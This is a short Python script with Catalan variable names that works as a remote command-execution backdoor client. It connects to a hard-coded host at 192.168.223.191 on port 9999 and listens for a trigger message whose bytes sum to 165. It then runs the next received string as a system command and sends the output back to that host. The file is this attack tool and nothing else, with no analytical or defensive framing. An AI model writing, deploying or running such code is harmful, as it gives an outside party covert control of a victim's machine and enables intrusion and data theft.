#!/usr/bin/env python
import socket, threading, subprocess, shlex

client = socket.socket()
ipserver = '192.168.223.191'
client.connect((ipserver,9999))

def comandes():
    global comanda
    ll = []
    buit = ""
    for i in rec:
        ll.append(chr(i))
    cmd = buit.join(ll)
    comanda = subprocess.check_output(str(cmd))
def rebre_server():
    global client, rec
    while True:
        rec = client.recv(1024)
        ll = []
        cero = 0
        for i in rec:
            ll.append(i)
        for i in ll:
            cero = cero + i
        if cero == 165:
            rec = client.recv(4096)
            comandes()
            client.send(str(comanda).encode('UTF-8'))

hilo2 = threading.Thread(target=rebre_server)

hilo2.start()
